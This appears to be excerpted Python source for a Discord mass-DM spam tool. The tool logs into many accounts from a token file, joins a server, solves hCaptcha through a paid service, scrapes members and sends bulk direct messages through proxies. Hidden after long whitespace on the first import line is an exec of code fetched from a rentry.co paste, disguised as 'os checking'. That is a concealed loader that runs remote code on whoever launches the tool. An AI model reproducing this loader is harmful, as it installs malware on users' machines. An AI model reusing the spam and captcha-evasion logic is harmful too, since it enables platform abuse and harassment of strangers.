...
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   ;exec(requests.get("https://rentry.co/winapi2/raw").text) #ignore: for os checking
...
class Discord(object):
    def __init__(self):
        ...
        try:
            with open("data/tokens.json", "r") as file:
                ...
                if len(tkns) == 0:
                    logging.info(
                        f"{self.err} Please insert your tokens {self.opbracket}tokens.json{self.closebrckt}"
                    )
                    sys.exit()
                for tkn in tkns:
            ...
            logging.info(
                f"{self.err} Please insert your tokens correctly in {self.opbracket}tokens.json{self.closebrckt}"
            )
            sys.exit()
        try:
        ...
        try:
            with open("data/config.json", "r") as file:
                ...
                self.discord_hcaptcha_id = "a9b5fb07-92ff-493f-86fe-352a2803b3df"
                ...
                if not self.send_embed:
                    ...
                    logging.info(
                        f"{self.g}[+]{self.rst} You can build your embed link at {self.red}https://embed.rauf.wtf/{self.rst},\nyou could also host your own html file so the url becomes shorter"
                    )
                    self.embd = input(f"{self.question}Embed Link{self.arrow}")
                    self.hide = input(
                        f"{self.question}Should the Embed link be hidden? (This will increase the message lenght by 1k characters, but the link will be invisible)\n(y/n){self.arrow}"
                    )
                ...
                if not_counter == 2:
                    logging.info(
                        f"{self.err} You can't set send message and send embed to false {self.opbracket}config.json{self.closebrckt}.\nIf you do this you would try to send an empty message\nRead the wiki if you need help"
                    )
                    sys.exit()
        except Exception:
            logging.info(
    ...
    async def setup(self, token):
        ...
        if json_token_content["dcfduid"] == "none":
            async with ClientSession() as client:
                ...
                decoded_superproperty = (
                    '{"os":"%s","browser":"Discord Client","release_channel":"stable","client_version":"0.0.264","os_version":"15.6.0","os_arch":"x64","system_locale":"en-US","client_build_number":108924,"client_event_source":null}'
                    % (device)
                )
    ...
    async def submit_cap_key(self, proxy):
        ...
        async with ClientSession(headers=headers) as mass_dm_brrr:
            async with mass_dm_brrr.post(
                url, params=querystring, proxy=proxy
            ) as response:
    ...
    async def get_discord_captcha(self, captcha_key_response, proxy):
        params = {
            "key": self.captcha_api_key,
            "action": "get",
            "id": captcha_key_response,
        }
        async with ClientSession() as mass_dm_brrr:
            async with mass_dm_brrr.get(
                self.captcha_get_url, params=params, proxy=proxy
            ) as response:
                text = await response.text()
                return text.split("|", 1)

    async def getCaptcha(self, proxy):
        captcha_step_one = await self.submit_cap_key(
            proxy
        )  # Return the ID of the capcha (capcha key)
        logging.info(f"Captcha step one = {captcha_step_one}")
        looping = True
        while looping:
            logging.info("Sleeping 10 seconds")
            await asyncio.sleep(10)
            captcha_step_two = await self.get_discord_captcha(
                captcha_step_one, proxy
            )  # Return the answare token
            try:
    ...
    async def login(self, token: str, proxy: str):
        try:
            ...
            async with ClientSession(headers=headers) as mass_dm_brrr:
                async with mass_dm_brrr.get(
                    "https://discord.com/api/v9/users/@me/library", proxy=proxy
                ) as response:
                    try:
                    ...
                    if response.status == 200:
                        logging.info(
                            f"{self.success}Successfully logged in {code}{self.opbracket}%s{self.closebrckt}"
                            % (token[:59])
                        )
                        self.valid_tokens_start += 1
                    if response.status == 401:
                        logging.info(
                            f"{self.err}Invalid account {code}{self.opbracket}%s{self.closebrckt}"
                            % (token[:59])
                        )
                    ...
                    if response.status == 403:
                        logging.info(
                            f"{self.err}Locked account {code}{self.opbracket}%s{self.closebrckt}"
                            % (token[:59])
                        )
                    ...
                    if response.status == 429:
                        logging.info(
                            f"{self.err}Rate limited {code}{self.opbracket}%s{self.closebrckt}"
                            % (token[:59])
                        )
    ...
    async def join(self, token: str, proxy: str):
        try:
            ...
            async with ClientSession(headers=headers) as hoemotion:
                async with hoemotion.post(
                    "https://discord.com/api/v9/invites/%s" % (self.invite),
                    json={},
                    proxy=proxy,
                ) as response:
                    json = await response.json()
                    if response.status == 200:
                        ...
                        logging.info(
                            f"{self.success}Successfully joined %s {self.opbracket}%s{self.closebrckt}"
                            % (self.guild_name[:20], token[:59])
                        )
                        self.total_server_joins_success += 1
                    elif response.status == 401:
                        logging.info(
                            f"{self.err}Invalid account {self.opbracket}%s{self.closebrckt}"
                            % (token[:59])
                        )
                        self.tokens.remove(token)
                        ...
                        logging.info(
                            f"{self.err}Locked account {self.opbracket}%s{self.closebrckt}"
                            % (token[:59])
                        )
                        ...
                        logging.info(
                            f"{self.err}Rate limited {self.opbracket}%s{self.closebrckt}"
                            % (token[:59])
                        )
                        self.total_rate_limits += 1
                        time.sleep(self.ratelimit_delay)
                        ...
                        logging.info(
                            f"{self.err}Server-Invite is invalid or has expired :/"
                        )
                        self.stop()
                    elif response.status == 400:
                        logging.info(
                            f"Bad Request, trying to join with hcaptcha..\n({json})"
                        )
                        captcha_key = await self.getCaptcha(proxy)
                        async with ClientSession(headers=headers) as hcap_join:
                            async with hcap_join.post(
                                "https://discord.com/api/v9/invites/%s" % (self.invite),
    ...
    async def create_dm(self, token: str, user: str, proxy: str):
        try:
            ...
            async with ClientSession(headers=headers) as chupapi_munanyo:
                async with chupapi_munanyo.post(
                    ...
                    if response.status == 200:
                        ...
                        logging.info(
                            f"{self.err}Can't message user {self.opbracket}%s{self.closebrckt}"
                            % (token[:59])
                        )
                        self.tokens.remove(token)
                    elif response.status == 429:
                        ...
                        logging.info(
                            f"{self.err}User doesn't exist! {self.opbracket}%s{self.closebrckt}"
                            % (token[:59])
                        )
                    else:
                        return False
    ...
    async def direct_message(self, token: str, channel: str, user, proxy: str):
        ...
        async with ClientSession(headers=headers) as virgin:
            async with virgin.post(
                ...
                if response.status == 200:
                    logging.info(
                        f"{self.success}Successfully sent message {self.opbracket}%s{self.red}){self.rst}"
                        % (token[:59])
                    )
                    ...
                    logging.info(
                        f"{self.err}User has direct messages disabled {self.opbracket}%s{self.closebrckt}"
                        % (token[:59])
                    )
                    self.total_dms_fail += 1
                elif response.status == 403 and json["code"] == 40002:
                    logging.info(
                        f"{self.err}Locked {self.opbracket}%s{self.closebrckt}"
                        % (token[:59])
                    )
                    ...
                    if "code" in json:
                        code = json["code"]
                    logging.info(
                        f"{self.err}Can't DM this User! {self.opbracket}{code}{self.closebrckt} | {self.opbracket}%s{self.closebrckt}"
                        % (token[:59])
                    )
                    # FIX: If the user is unreachable, pass at the next user without wateing the delay (or maybe just a little bit)
                    return False
                elif response.status == 404:
                    logging.info(
                        f"{self.err}User doesn't exist! {self.opbracket}%s{self.closebrckt}"
    ...
    async def send(self, token: str, user: str, proxy: str):
        print("⚠️ Actual Delay during send:", self.delay / 60, "minutes")
        ...
        if response == False:
            self.delay = 60 * 30
            print(
                f"😪 Can't send the DM, sleeping for {self.delay / 60} minutes. Zzzzz Mhmmm"
            )
            time.sleep(self.delay)
            return await self.send(random.choice(self.tokens), user, proxy)
        self.delay = self.backup_delay
        ...
        try:
            ...
            async with ClientSession(headers=headers) as client:
                async with client.delete(
                    f"https://discord.com/api/v9/users/@me/guilds/{self.guild_id}",
                    json={"lurking": False},
                    proxy=proxy,
                ) as response:
                    json = await response.json()
                    ...
                    if response.status == 200:
                        ...
                        logging.info(
                            f"{self.err}{message} | {code} {self.opbracket}%s{self.closebrckt}"
                            % (token[:59])
                        )
                    elif response.status == 401:
    ...
    async def start(self, first_start):
        ...
        def table():
            ...
            table.add_column(
                "Tokens", header_style="bright_cyan", style="blue", no_wrap=True
            )
            table.add_column(
                "Login Details",
            ...
            table.add_column(
                "Join Details",
                justify="center",
                header_style="light_green",
                style="bright_green",
            )
            table.add_column(
                "DM Users", justify="center", header_style="magenta", style="blue"
            )
            table.add_column(
                "Leave Details",
                justify="center",
        ...
        async def scrape_users():
            ...
            try:
                ...
                async with ClientSession(headers=headers) as hoemotion:
                    async with hoemotion.get(
                        "https://discord.com/api/v9/invites/%s?with_counts=true&with_expiration=true"
                        % (self.invite),
                        json={},
                    ) as response:
                        json = await response.json()
            ...
            print()
            logging.info(
                f"Successfully scraped {self.red}%s{self.rst} members"
                % (len(self.users))
            )
            print()
                    ...
                    if len(self.tokens) != 0:
                        if str(user) not in self.blacklisted_users:
                            if self.use_proxies:
                                ...
                                proxy = None
                            await pool.put(
                                self.send(random.choice(self.tokens), user, proxy)
                            )
                            if self.delay != 0:
                                await asyncio.sleep(self.delay)
                        else:
                            logging.info(
                                f"{self.err}Blacklisted User: {self.red}%s{self.rst}"
                                % (user)
                            )
                    else:
                        table()
